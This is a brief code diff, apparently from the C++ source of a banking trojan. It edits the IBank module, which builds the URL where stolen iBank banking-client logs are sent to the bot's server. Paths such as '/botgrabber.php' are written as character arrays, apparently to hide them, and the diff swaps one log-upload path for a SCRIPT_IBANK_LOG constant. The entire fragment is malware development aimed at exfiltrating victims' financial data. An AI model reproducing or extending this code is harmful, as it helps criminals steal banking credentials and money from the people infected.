@@ -49,7 +49,7 @@ namespace IBANKDEBUGSTRINGS
 	char IBankLogPathJavaHost[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
 #endif
 
-	char IBankLogPathMainHost[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
+
 
 
 
@@ -471,7 +471,7 @@ namespace IBank
 				return GetJavaScriptURL(IBankLogPathJavaHost);
 		#endif
 
-		return GetBotScriptURL(0, IBankLogPathMainHost);
+		return GetBotScriptURL(SCRIPT_IBANK_LOG);
     }
 
 	//-----------------------------------------------------------------------
